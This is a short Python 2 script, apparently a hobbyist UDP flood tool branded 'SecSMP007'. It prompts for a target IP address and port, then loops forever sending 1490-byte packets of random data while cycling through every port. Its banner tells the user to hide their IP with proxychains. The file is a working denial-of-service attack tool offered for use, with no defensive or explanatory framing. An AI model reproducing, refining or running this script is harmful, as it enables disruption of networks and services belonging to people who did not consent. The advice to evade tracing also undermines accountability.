import sys
import os
import time
import socket
import random
 
from datetime import datetime 

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year


sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)


os.system("clear")
os.system("figlet  SMP")
print "=========================================="
print "SAMIR    :PATNI"
print "OwNeR    : SecSMP007" 
print "github   : https://github.com/SecSMP"
print "INDIA    : JAY HIND" 
print "==========================================" 
ip = raw_input("Enter Your Target : ")
port = input("Enter Port Number  : ")

os.system("clear")
os.system("figlet SecSMP007")

print "======================================"
print "HIDE YOUR IP  "
time.sleep(5)
print "PLEASE WAIT...."
time.sleep(5)
print "LOADING....."
time.sleep(5)
print "PROXYCHAINS USE PLEASE"
time.sleep(5)
print "COMPLATE WELLCOME TO SecSMP007"
print "======================================="
time.sleep(3)
sent = 0

while True:
          sock.sendto(bytes, (ip,port))
          sent = sent + 1
          port = port + 1 
          print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
          if port == 65534:
             port = 1

 
